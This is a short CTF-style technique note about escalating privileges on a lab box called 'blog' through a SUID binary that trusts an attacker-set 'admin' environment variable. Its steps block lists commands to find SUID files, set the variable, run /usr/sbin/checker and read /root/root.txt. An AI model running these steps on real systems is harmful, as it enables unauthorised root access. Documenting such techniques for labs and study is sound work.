# SUID Environment Variable Gate Bypass

A SUID binary that trusts an environment variable can be tricked into running its privileged path.

Used on: **blog**

## Why It Works

The `checker` binary gates privileged behavior on the `admin` environment variable. Because the variable is attacker-controlled, setting it to the expected value makes the SUID binary execute the privileged branch.

## Prerequisites

- Shell as a low-privileged user.
- SUID binary present and executable.
- The binary's decision depends on an environment variable.

## Steps

<!-- cmd: linux -->
```bash
find / -perm -4000 -type f 2>/dev/null
export admin=admin
/usr/sbin/checker
cat /root/root.txt
```

## Related Notes

- `../../payloads/shell-stabilization/python-pty.md`

